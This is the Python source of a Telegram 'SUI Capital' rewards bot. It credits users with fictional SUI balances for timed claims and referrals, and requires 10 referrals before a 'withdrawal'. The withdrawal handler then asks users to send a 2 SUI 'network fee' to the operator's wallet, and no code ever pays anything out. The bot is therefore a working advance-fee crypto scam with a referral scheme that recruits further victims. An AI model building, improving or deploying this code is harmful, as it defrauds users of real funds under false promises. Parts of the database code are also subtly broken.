from telegram import Update, ReplyKeyboardMarkup, Message
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime, timedelta, UTC
from decimal import Decimal
from typing import Optional, Dict
import logging
import re
import asyncio
from cachetools import TTLCache, LRUCache
import nest_asyncio
from contextlib import asynccontextmanager
import os
import sys
import psycopg2
from psycopg2.extras import DictCursor
from psycopg2.pool import SimpleConnectionPool
from urllib.parse import urlparse
from signal import signal, SIGINT, SIGTERM, SIGABRT
import time

# Apply nest_asyncio at startup
nest_asyncio.apply()

# Logging configuration - only log errors
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO  # Cambiado a INFO para ver más detalles
)

logger = logging.getLogger(__name__)

# Bot configuration
TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID')
SUI_ADDRESS = os.getenv('SUI_ADDRESS')

if not all([TOKEN, ADMIN_ID, SUI_ADDRESS]):
    raise ValueError("Missing required environment variables")

# Rewards system
REWARDS = {
    "claim": Decimal("1"),
    "daily": Decimal("5"),
    "referral": Decimal("3"),
    "min_withdraw": Decimal("36"),
    "network_fee": Decimal("2"),
    "min_referrals": 10
}

class DatabasePool:
    def __init__(self, pool_size=20):
        self.pool_size = pool_size
        self.pool = None
        self.user_cache = TTLCache(maxsize=10000, ttl=300)  # 5 minutes cache

    async def initialize(self):
        """Initialize database pool with better error handling"""
        try:
            DATABASE_URL = os.getenv('DATABASE_URL')
            if not DATABASE_URL:
                raise ValueError("DATABASE_URL environment variable is required")

            url = urlparse(DATABASE_URL)
            self.pool = SimpleConnectionPool(
                1, self.pool_size,
                user=url.username,
                password=url.password,
                host=url.hostname,
                port=url.port,
                database=url.path[1:],
                sslmode='require'
            )
            
            # Initialize tables
            self._initialize_tables()
            logger.info("Database initialized successfully")
            
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            raise

    def _initialize_tables(self):
        """Initialize database tables with better structure"""
        with self.get_connection() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        user_id TEXT PRIMARY KEY,
                        username TEXT,
                        balance NUMERIC(20,8) DEFAULT 0,
                        total_earned NUMERIC(20,8) DEFAULT 0,
                        referrals INTEGER DEFAULT 0,
                        last_claim TIMESTAMP DEFAULT NOW(),
                        last_daily TIMESTAMP DEFAULT NOW(),
                        wallet TEXT,
                        referred_by TEXT,
                        join_date TIMESTAMP DEFAULT NOW(),
                        FOREIGN KEY (referred_by) REFERENCES users(user_id)
                    )
                """)
                conn.commit()
                logger.info("Database tables initialized successfully")

    def get_connection(self):
        """Get a database connection from the pool"""
        if not self.pool:
            raise Exception("Database pool not initialized")
        return self.pool.getconn()

    def put_connection(self, conn):
        """Return a connection to the pool"""
        if self.pool:
            self.pool.putconn(conn)

    @asynccontextmanager
    async def connection(self):
        """Context manager for database connections"""
        conn = None
        try:
            conn = self.get_connection()
            yield conn
        finally:
            if conn:
                self.put_connection(conn)

    async def save_user(self, user_data: dict):
        """Guardar datos del usuario en PostgreSQL"""
        conn = self.get_connection()
        with conn.cursor() as cur:
            cur.execute("""
                INSERT INTO users 
                (user_id, username, balance, total_earned, referrals, 
                last_claim, last_daily, wallet, referred_by, join_date)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                ON CONFLICT (user_id) DO UPDATE SET
                username = EXCLUDED.username,
                balance = EXCLUDED.balance,
                total_earned = EXCLUDED.total_earned,
                referrals = EXCLUDED.referrals,
                last_claim = EXCLUDED.last_claim,
                last_daily = EXCLUDED.last_daily,
                wallet = EXCLUDED.wallet,
                referred_by = EXCLUDED.referred_by
            """, (
                user_data["user_id"],
                user_data["username"],
                Decimal(user_data["balance"]),
                Decimal(user_data["total_earned"]),
                user_data["referrals"],
                datetime.fromisoformat(user_data["last_claim"]) if user_data["last_claim"] else None,
                datetime.fromisoformat(user_data["last_daily"]) if user_data["last_daily"] else None,
                user_data.get("wallet"),
                user_data.get("referred_by"),
                datetime.fromisoformat(user_data.get("join_date", datetime.now().isoformat()))
            ))
        
        # Actualizar caché
        self.user_cache[user_data["user_id"]] = user_data.copy()

    async def optimize_db(self):
        """Optimize database performance for PostgreSQL"""
        async with self.get_connection() as conn:
            with conn.cursor() as cur:
                # Cambiado a comandos PostgreSQL
                cur.execute("VACUUM ANALYZE users")

    async def get_user(self, user_id: str) -> Optional[Dict]:
        """Get user data from cache or database"""
        # Check cache first
        if user_id in self.user_cache:
            return self.user_cache[user_id]
        
        # Get from database
        try:
            conn = self.get_connection()
            with conn.cursor(cursor_factory=DictCursor) as cur:
                cur.execute("""
                    SELECT user_id, username, balance, total_earned, 
                           referrals, last_claim, last_daily, wallet, 
                           referred_by, join_date
                    FROM users 
                    WHERE user_id = %s
                """, (user_id,))
                
                result = cur.fetchone()
                if result:
                    # Convert to dict and cache
                    user_data = dict(result)
                    # Convert datetime to ISO format string
                    user_data["last_claim"] = user_data["last_claim"].isoformat()
                    user_data["last_daily"] = user_data["last_daily"].isoformat()
                    user_data["join_date"] = user_data["join_date"].isoformat()
                    # Cache the result
                    self.user_cache[user_id] = user_data
                    return user_data
                return None
                
        except Exception as e:
            logger.error(f"Error getting user {user_id}: {e}")
            return None

class SUIBot:
    def __init__(self):
        # Validate environment variables
        self.token = os.getenv('BOT_TOKEN')
        self.admin_id = os.getenv('ADMIN_ID')
        self.sui_address = os.getenv('SUI_ADDRESS')
        
        if not all([self.token, self.admin_id, self.sui_address]):
            raise ValueError("Missing required environment variables")
            
        # Initialize database and cache
        self.db_pool = DatabasePool(pool_size=20)
        self.user_cache = TTLCache(maxsize=10000, ttl=300)
        
        # Initialize keyboard with better layout
        self._keyboard = ReplyKeyboardMarkup([
            ["🌟 Collect", "📅 Daily Reward"],
            ["📊 My Stats", "👨‍👦‍👦 Invite"],
            ["💸 Cash Out", "🔑 SUI Address"],
            ["🏆 Leaders", "❓ Info"]
        ], resize_keyboard=True)
        
        self.notification_task = None

    async def init_db(self):
        """Initialize database connection"""
        await self.db_pool.initialize()

    async def get_user(self, user_id: str) -> Optional[Dict]:
        """Get user data from database"""
        return await self.db_pool.get_user(user_id)

    async def save_user(self, user_data: dict):
        """Save user data to database"""
        await self.db_pool.save_user(user_data)

    async def _notify_referrer(self, bot, referrer_id: str):
        """Notify referrer about new referral"""
        try:
            await bot.send_message(
                chat_id=referrer_id,
                text=(
                    f"👥 New referral joined!\n"
                    f"💰 You earned {REWARDS['referral']} SUI!"
                )
            )
        except Exception as e:
            logger.error(f"Failed to notify referrer {referrer_id}: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler"""
        if not update.message:
            return

        user_id = str(update.effective_user.id)
        username = update.effective_user.username or "Anonymous"
        
        try:
            user_data = await self.get_user(user_id)
            
            if not user_data:
                # Initialize new user data
                user_data = {
                    "user_id": user_id,
                    "username": username,
                    "balance": "0",
                    "total_earned": "0",
                    "referrals": 0,
                    "last_claim": (datetime.now() - timedelta(hours=2)).isoformat(),
                    "last_daily": (datetime.now() - timedelta(days=2)).isoformat(),
                    "wallet": None,
                    "referred_by": None,
                    "join_date": datetime.now().isoformat()
                }

                # Process referral
                if context.args and len(context.args) > 0:
                    referrer_id = context.args[0]
                    
                    if referrer_id != user_id:  # Prevent self-referral
                        referrer_data = await self.get_user(referrer_id)
                        
                        if referrer_data:
                            # Update new user with referral bonus
                            user_data["balance"] = str(REWARDS["referral"])
                            user_data["total_earned"] = str(REWARDS["referral"])
                            user_data["referred_by"] = referrer_id

                            # Save new user first
                            await self.save_user(user_data)

                            try:
                                # Update referrer's data
                                referrer_data["balance"] = str(Decimal(referrer_data["balance"]) + REWARDS["referral"])
                                referrer_data["total_earned"] = str(Decimal(referrer_data["total_earned"]) + REWARDS["referral"])
                                referrer_data["referrals"] = referrer_data["referrals"] + 1

                                # Save referrer's updated data
                                await self.save_user(referrer_data)

                                # Notify referrer
                                await self._notify_referrer(context.bot, referrer_id)
                                
                            except Exception as e:
                                logger.error(f"Error updating referrer: {e}")
                else:
                    # Save new user without referral
                    await self.save_user(user_data)

            # Send welcome message
            welcome_msg = self._get_welcome_message(user_data)
            await update.message.reply_text(welcome_msg, reply_markup=self._keyboard)

        except Exception as e:
            logger.error(f"Critical error in start handler: {str(e)}")
            await update.message.reply_text("⚠️ Something went wrong. Please try again later.")

    def _get_welcome_message(self, user_data):
        """Separate method for welcome message to improve readability"""
        if user_data.get("referred_by"):
            return (
                f"🌟 Welcome to SUI Capital Bot〽️\n\n"
                f"💎 Congratulations! You've received {REWARDS['referral']} SUI as a referral bonus!\n\n"
                "💰 Earning Methods:\n"
                "• ⚡ Hourly Claims\n"
                "• 📅 Daily Rewards\n"
                "• 👥 Referral Program\n\n"
                "🔥 Start earning now with our reward system!"
            )
        return (
            "🌟 Welcome to SUI Capital Bot〽️\n\n"
            "💰 Start Earning SUI:\n"
            "• ⚡ Hourly Claims\n"
            "• 📅 Daily Rewards\n"
            "• 👥 Referral Program\n\n"
            "🔥 Join our community and start earning today!"
        )

    async def handle_claim(self, update: Update, user_data: dict):
        """Improved claim handler with better error handling"""
        try:
            now = datetime.now()
            last_claim = datetime.fromisoformat(user_data["last_claim"])
            
            if now - last_claim < timedelta(minutes=5):  # Cambiado a 5 minutos
                time_left = timedelta(minutes=5) - (now - last_claim)
                minutes = int(time_left.total_seconds() // 60)
                seconds = int(time_left.total_seconds() % 60)
                
                await update.message.reply_text(
                    f"⏳ Next Bonus Available In:\n"
                    f"──────────────────\n"
                    f"⌚ {minutes}m {seconds}s\n"
                    f"──────────────────\n"
                    f"💡 Come back later!"
                )
                return

            # Update balance
            new_balance = Decimal(user_data["balance"]) + REWARDS["claim"]
            new_total = Decimal(user_data["total_earned"]) + REWARDS["claim"]
            
            # Update user data
            user_data.update({
                "balance": str(new_balance),
                "total_earned": str(new_total),
                "last_claim": now.isoformat()
            })
            
            # Save to database
            await self.save_user(user_data)
            
            await update.message.reply_text(
                f"✅ Bonus Collected!\n"
                f"──────────────────\n"
                f"💰 Earned: {REWARDS['claim']} SUI\n"
                f"💎 Balance: {new_balance:.2f} SUI\n"
                f"──────────────────\n"
                f"⏱ Next bonus in 5 minutes"
            )
            
        except Exception as e:
            logger.error(f"Error in claim handler: {e}")
            await update.message.reply_text("❌ An error occurred. Please try again!")

    async def handle_daily(self, update: Update, user_data: dict):
        """Improved daily handler with better validation"""
        try:
            now = datetime.now()
            last_daily = datetime.fromisoformat(user_data["last_daily"])
            
            if now - last_daily < timedelta(days=1):
                time_left = timedelta(days=1) - (now - last_daily)
                hours = int(time_left.total_seconds() // 3600)
                minutes = int((time_left.total_seconds() % 3600) // 60)
                
                await update.message.reply_text(
                    f"⏳ Next Daily Reward In:\n"
                    f"──────────────────\n"
                    f"⌚ {hours}h {minutes}m\n"
                    f"──────────────────\n"
                    f"💡 Come back tomorrow!"
                )
                return

            # Update balance
            new_balance = Decimal(user_data["balance"]) + REWARDS["daily"]
            new_total = Decimal(user_data["total_earned"]) + REWARDS["daily"]
            
            # Update user data
            user_data.update({
                "balance": str(new_balance),
                "total_earned": str(new_total),
                "last_daily": now.isoformat()
            })
            
            # Save to database
            await self.save_user(user_data)
            
            await update.message.reply_text(
                f"✅ Daily Reward Collected!\n"
                f"──────────────────\n"
                f"💰 Earned: {REWARDS['daily']} SUI\n"
                f"💎 Balance: {new_balance:.2f} SUI\n"
                f"──────────────────\n"
                f"⏱ Next reward in 24 hours"
            )
            
        except Exception as e:
            logger.error(f"Error in daily handler: {e}")
            await update.message.reply_text("❌ An error occurred. Please try again!")

    async def handle_balance(self, update: Update, user_data: dict):
        await update.message.reply_text(
            f"📊 My Stats: {user_data['balance']} SUI\n"
            f"👨‍👦‍👦 Invite: {user_data['referrals']}\n"
            f"🌟 Total earned: {user_data['total_earned']} SUI"
        )

    async def handle_referral(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_data: dict):
        ref_link = f"https://t.me/{context.bot.username}?start={user_data['user_id']}"
        await update.message.reply_text(
            f"👨‍👦‍👦 Your referral link:\n{ref_link}\n\n"
            f"Current referrals: {user_data['referrals']}\n"
            f"Reward per referral: {REWARDS['referral']} SUI\n\n"
            f"✨ You and your referral get {REWARDS['referral']} SUI!"
        )

    async def handle_withdraw(self, update: Update, user_data: dict):
        """Handle withdraw command"""
        if not user_data.get("wallet"):
            await update.message.reply_text(
                "🔑 Please set your SUI wallet address first!\n"
                "Use the SUI Address button to connect your wallet."
            )
            return

        # Get current balance and referrals
        balance = Decimal(user_data["balance"])
        referrals = user_data["referrals"]

        # First message: Requirements overview
        await update.message.reply_text(
            f"🎯 Withdrawal Requirements\n"
            f"──────────────────\n"
            f"📌 Minimum Balance: {REWARDS['min_withdraw']} SUI\n"
            f"📌 Required Referrals: {REWARDS['min_referrals']}\n"
            f"──────────────────\n"
            f"💼 Your Status:\n"
            f"💰 Balance: {balance:.2f} SUI\n"
            f"👥 Referrals: {referrals}\n"
            f"──────────────────\n"
            f"📱 Required Channels:\n"
            f"• @SUI_Capital_Tracker\n"
            f"• @SUI_Capital_News\n"
            f"• @SUI_Capital_QA"
        )

        # Check requirements and show appropriate message
        if referrals < REWARDS["min_referrals"]:
            await update.message.reply_text(
                f"⚠️ Referral Requirement Not Met\n"
                f"──────────────────\n"
                f"• Need: {REWARDS['min_referrals']} referrals\n"
                f"• Have: {referrals} referrals\n\n"
                f"📢 Share your referral link to earn more!"
            )
            return

        if balance < REWARDS["min_withdraw"]:
            await update.message.reply_text(
                f"⚠️ Balance Requirement Not Met\n"
                f"──────────────────\n"
                f"• Need: {REWARDS['min_withdraw']} SUI\n"
                f"• Have: {balance:.2f} SUI\n\n"
                f"💡 Keep collecting rewards to reach the minimum!"
            )
            return

        # If all requirements are met
        await update.message.reply_text(
            f"✅ Withdrawal Request\n"
            f"──────────────────\n"
            f"💎 Amount: {balance:.2f} SUI\n"
            f"🏦 Wallet: {user_data['wallet']}\n"
            f"🌐 Network: SUI Network\n"
            f"──────────────────\n"
            f"📌 Network Fee: {REWARDS['network_fee']} SUI\n"
            f"💫 Total to Receive: {balance - REWARDS['network_fee']:.2f} SUI\n"
            f"──────────────────\n"
            f"📤 Send fee to this address:\n"
            f"`{SUI_ADDRESS}`\n"
            f"──────────────────\n"
            f"⏱ Processing Time: 5-15 minutes\n"
            f"💡 Important:\n"
            f"• Send exact fee amount\n"
            f"• Use SUI Network only\n"
            f"• Withdrawal processed after fee"
        )

    async def handle_wallet(self, update: Update):
        await update.message.reply_text(
            "🔑 Send your SUI (SUI) wallet address:\n\n"
            "⚠️ IMPORTANT WARNING:\n"
            "• Double check your SUI address carefully\n"
            "• Incorrect addresses will result in permanent loss of funds\n"
            "• We are not responsible for funds sent to wrong addresses\n\n"
            
        )

    async def handle_ranking(self, update: Update):
        """Handle the leaders command"""
        try:
            conn = self.db_pool.get_connection()
            with conn.cursor(cursor_factory=DictCursor) as cur:
                cur.execute("""
                    SELECT username, total_earned, referrals 
                    FROM users 
                    ORDER BY CAST(total_earned AS DECIMAL) DESC 
                    LIMIT 10
                """)
                rows = cur.fetchall()

                if not rows:
                    await update.message.reply_text("No leaders yet!")
                    return

                message = "🏆 Top 10 Leaders:\n\n"
                for i, row in enumerate(rows, 1):
                    username = row['username'] or "Anonymous"
                    total_earned = Decimal(row['total_earned'])
                    referrals = row['referrals']
                    
                    message += (
                        f"{i}. @{username}\n"
                        f"💰 Earned: {total_earned:.2f} SUI\n"
                        f"👥 Referrals: {referrals}\n\n"
                    )

                await update.message.reply_text(message)

        except Exception as e:
            logger.error(f"Error in ranking handler: {e}")
            await update.message.reply_text(
                "❌ Error loading leaderboard. Please try again later!"
            )

    async def handle_help(self, update: Update):
        await update.message.reply_text(
            "🌟 Welcome to SUI Rewards Bot!\n\n"
            "💎 Earning Opportunities:\n"
            "• 🕒 Minutes Claim Bonus\n"
            "• 📅 Daily Reward (24h)\n"
            "• 👥 Referral Program\n\n"
            "💰 Withdrawal Information:\n"
            "• ⚡ Network: SUI (SUI)\n"
            "• ⏱ Processing: 5 minutes\n\n"
            "📱 Official Channel:\n"
            "• @SUI_Capital_Tracker\n\n"
            "🔐 Security Notice:\n"
            "• Always verify wallet addresses\n"
            "• Never share personal information"
        )

    async def handle_mailing(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to send message to all users"""
        if str(update.effective_user.id) != ADMIN_ID:
            return

        if not context.args:
            await update.message.reply_text("Usage: /mailing <message>")
            return

        message = ' '.join(context.args)
        
        # Notify admin that mailing started
        status_message = await update.message.reply_text(
            "📤 Starting mailing...\n"
            "Bot will continue working normally."
        )
        
        # Start mailing in background
        asyncio.create_task(self._execute_mailing(message, status_message, context))
        
    async def _execute_mailing(self, message: str, status_message: Message, context: ContextTypes.DEFAULT_TYPE):
        """Execute mailing in background"""
        success = 0
        failed = 0
        BATCH_SIZE = 100  # Process users in batches
        
        try:
            conn = self.db_pool.get_connection()
            with conn.cursor() as cur:
                # Get total users count
                cur.execute("SELECT COUNT(*) FROM users")
                total_users = cur.fetchone()[0]
                
                # Process users in batches
                for offset in range(0, total_users, BATCH_SIZE):
                    try:
                        # Get batch of users
                        cur.execute("""
                            SELECT user_id FROM users 
                            LIMIT %s OFFSET %s
                        """, (BATCH_SIZE, offset))
                        
                        batch_users = cur.fetchall()
                        
                        for row in batch_users:
                            try:
                                user_id = row[0]
                                await context.bot.send_message(
                                    chat_id=user_id,
                                    text=f"📢 Announcement:\n\n{message}"
                                )
                                success += 1
                            except Exception as e:
                                logger.error(f"Failed to send to {user_id}: {e}")
                                failed += 1
                            
                            # Update status every 50 users
                            if (success + failed) % 50 == 0:
                                try:
                                    await status_message.edit_text(
                                        f"📤 Mailing in progress...\n"
                                        f"──────────────────\n"
                                        f"✅ Sent: {success}\n"
                                        f"❌ Failed: {failed}\n"
                                        f"📊 Progress: {((success + failed) / total_users) * 100:.1f}%"
                                    )
                                except Exception:
                                    pass
                            
                            # Small delay to avoid rate limits
                            await asyncio.sleep(0.05)
                        
                        # Commit after each batch
                        conn.commit()
                        
                    except Exception as e:
                        logger.error(f"Error processing batch: {e}")
                        continue
                
        except Exception as e:
            logger.error(f"Error in mailing: {e}")
        finally:
            if conn:
                self.db_pool.put_connection(conn)
            
            # Final status update
            try:
                await status_message.edit_text(
                    f"📤 Mailing completed!\n"
                    f"──────────────────\n"
                    f"✅ Successfully sent: {success}\n"
                    f"❌ Failed: {failed}\n"
                    f"📊 Total processed: {success + failed}"
                )
            except Exception:
                pass

    async def handle_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin command to get bot statistics"""
        if str(update.effective_user.id) != self.admin_id:
            return

        try:
            conn = self.db_pool.get_connection()
            with conn.cursor() as cur:
                # Get total users
                cur.execute("SELECT COUNT(*) FROM users")
                total_users = cur.fetchone()[0]

                # Get active users (last 24h)
                cur.execute("""
                    SELECT COUNT(*) FROM users 
                    WHERE last_claim > NOW() - INTERVAL '24 hours'
                    OR last_daily > NOW() - INTERVAL '24 hours'
                """)
                active_users = cur.fetchone()[0]

                # Get total earned
                cur.execute("SELECT SUM(CAST(total_earned AS DECIMAL)) FROM users")
                total_earned = cur.fetchone()[0] or 0

                # Get total referrals
                cur.execute("SELECT SUM(referrals) FROM users")
                total_referrals = cur.fetchone()[0] or 0

            await update.message.reply_text(
                f"📊 Bot Statistics\n"
                f"──────────────────\n"
                f"👥 Total Users: {total_users:,}\n"
                f"✨ Active Users (24h): {active_users:,}\n"
                f"💰 Total SUI Earned: {total_earned:,.2f}\n"
                f"👥 Total Referrals: {total_referrals:,}\n"
                f"💾 Cached Users: {len(self.user_cache):,}\n"
                f"──────────────────\n"
                f"🕒 Updated: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )

        except Exception as e:
            logger.error(f"Error in stats: {e}")
            await update.message.reply_text("❌ Error getting statistics!")
        finally:
            if conn:
                self.db_pool.put_connection(conn)

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message or not update.message.text:
            await update.message.reply_text("⚡ Please send /start to begin")
            return

        text = update.message.text
        user_id = str(update.effective_user.id)
        
        try:
            user_data = await self.get_user(user_id)
            if not user_data:
                await update.message.reply_text("⚡ Please send /start to begin")
                return

            # Handle wallet address - accept any text but show warning
            if len(text) > 25 and not text.startswith('/'):  # Basic check for potential address
                user_data["wallet"] = text
                asyncio.create_task(self.save_user(user_data))
                await update.message.reply_text(
                    "✅ SUI address saved!\n\n"
                    "⚠️ IMPORTANT:\n"
                    "• Verify your address is correct\n"
                    "• Wrong addresses will result in lost funds\n"
                    "• No recovery possible for incorrect addresses"
                )
                return

            # Command mapping to handlers
            handlers = {
                "🌟 Collect": (self.handle_claim, (update, user_data)),
                "📅 Daily Reward": (self.handle_daily, (update, user_data)),
                "📊 My Stats": (self.handle_balance, (update, user_data)),
                "👨‍👦‍👦 Invite": (self.handle_referral, (update, context, user_data)),
                "💸 Cash Out": (self.handle_withdraw, (update, user_data)),
                "🔑 SUI Address": (self.handle_wallet, (update,)),
                "🏆 Leaders": (self.handle_ranking, (update,)),
                "❓ Info": (self.handle_help, (update,))
            }

            if handler_info := handlers.get(text):
                handler, args = handler_info
                await handler(*args)
            else:
                await update.message.reply_text("⚠️ Unknown command")
                
        except Exception as e:
            logger.error(f"Error handling message: {e}")
            await update.message.reply_text("❌ An error occurred!")

    async def start_notification_task(self):
        """Background task to check and send notifications"""
        BATCH_SIZE = 1000
        while True:
            try:
                conn = self.db_pool.get_connection()
                with conn.cursor(cursor_factory=DictCursor) as cur:
                    cur.execute("""
                        SELECT user_id, 
                               last_claim,
                               last_daily
                        FROM users 
                        WHERE last_claim < NOW() - INTERVAL '5 minutes'
                        OR last_daily < NOW() - INTERVAL '24 hours'
                        LIMIT %s
                    """, (BATCH_SIZE,))
                    rows = cur.fetchall()
                    
                    for row in rows:
                        try:
                            user_id = row['user_id']
                            last_claim = row['last_claim']
                            last_daily = row['last_daily']
                            
                            # Usar datetime.now(UTC) en lugar de utcnow()
                            now = datetime.now(UTC).replace(tzinfo=None)
                            
                            # Convertir last_claim y last_daily a UTC naive
                            if isinstance(last_claim, datetime):
                                last_claim = last_claim.replace(tzinfo=None)
                            else:
                                continue
                            
                            if isinstance(last_daily, datetime):
                                last_daily = last_daily.replace(tzinfo=None)
                            else:
                                continue

                            if now - last_daily > timedelta(days=1):
                                await self.application.bot.send_message(
                                    chat_id=user_id,
                                    text="📅 Your daily bonus is ready!\nCome back to claim it!"
                                )
                            
                            if now - last_claim > timedelta(minutes=5):
                                await self.application.bot.send_message(
                                    chat_id=user_id,
                                    text="🌟 Hey! Collect your bonus\nClaim it now!"
                                )
                        except Exception as e:
                            logger.error(f"Error processing notification for {user_id}: {e}")
                        await asyncio.sleep(0.05)
                        
            except Exception as e:
                logger.error(f"Error in notification task: {e}")
            finally:
                if conn:
                    self.db_pool.put_connection(conn)
                await asyncio.sleep(60)

    async def handle_invite(self, update: Update):
        """Handle invite command"""
        if not update.message:
            return
        
        user_id = str(update.effective_user.id)
        bot_username = (await update.get_bot()).username
        
        try:
            user_data = await self.get_user(user_id)
            if not user_data:
                await update.message.reply_text("⚠️ Please start the bot first with /start")
                return

            referral_link = f"https://t.me/{bot_username}?start={user_id}"
            referrals = user_data.get("referrals", 0)
            earned = Decimal(user_data.get("total_earned", "0"))
            
            await update.message.reply_text(
                f"🤝 Share your referral link:\n"
                f"{referral_link}\n\n"
                f"👥 Your referrals: {referrals}\n"
                f"💰 Earned from referrals: {earned} SUI\n\n"
                f"💎 Earn {REWARDS['referral']} SUI for each referral!"
            )
        except Exception as e:
            logger.error(f"Error in invite handler: {e}")
            await update.message.reply_text("❌ An error occurred!")

async def main():
    """Initialize and start the bot"""
    try:
        # Initialize bot and database
        bot = SUIBot()
        await bot.init_db()
        
        # Initialize application with better error handling
        application = (
            Application.builder()
            .token(bot.token)
            .connect_timeout(30)  # Increased timeout
            .read_timeout(30)
            .write_timeout(30)
            .get_updates_connect_timeout(30)
            .get_updates_read_timeout(30)
            .get_updates_write_timeout(30)
            .build()
        )
        bot.application = application

        # Add handlers
        application.add_handler(CommandHandler("start", bot.start))
        application.add_handler(CommandHandler("mailing", bot.handle_mailing))
        application.add_handler(CommandHandler("stats", bot.handle_stats))
        application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            bot.handle_message
        ))
        application.add_handler(CommandHandler("leaders", bot.handle_ranking))
        application.add_handler(MessageHandler(
            filters.Regex(r"^🏆 Leaders$"), 
            bot.handle_ranking
        ))
        
        # Add error handler with retry logic
        application.add_error_handler(error_handler)
        
        # Start notification task
        bot.notification_task = asyncio.create_task(bot.start_notification_task())
        
        logger.info("Bot started successfully!")
        
        # Start polling with better error handling
        await application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
            close_loop=False,
            pool_timeout=30,
            read_timeout=30,
            write_timeout=30
        )
        
    except Exception as e:
        logger.error(f"Critical error: {e}")
        raise

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors in the telegram bot with retry logic."""
    error = context.error
    
    # Log the error
    logger.error(f"Exception while handling an update: {error}")
    
    # Handle specific errors
    if "Conflict: terminated by other getUpdates request" in str(error):
        logger.info("Detected multiple instance conflict, waiting to stabilize...")
        await asyncio.sleep(5)  # Wait for other instance to settle
        return
    
    # Notify admin of other errors
    if ADMIN_ID:
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"❌ Error in bot: {error}"
            )
        except Exception as e:
            logger.error(f"Failed to send error message to admin: {e}")

if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Set up signal handlers
    for sig in (SIGINT, SIGTERM, SIGABRT):
        signal(sig, lambda s, f: sys.exit(0))
    
    # Apply nest_asyncio
    nest_asyncio.apply()
    
    # Run the bot with retry logic
    retry_count = 0
    max_retries = 3
    
    while retry_count < max_retries:
        try:
            asyncio.run(main())
            break
        except (KeyboardInterrupt, SystemExit):
            logger.info("Bot stopped")
            break
        except Exception as e:
            retry_count += 1
            logger.error(f"Error (attempt {retry_count}/{max_retries}): {e}")
            if retry_count < max_retries:
                logger.info(f"Retrying in 5 seconds...")
                time.sleep(5)
            else:
                logger.error("Max retries reached, exiting.")
                sys.exit(1)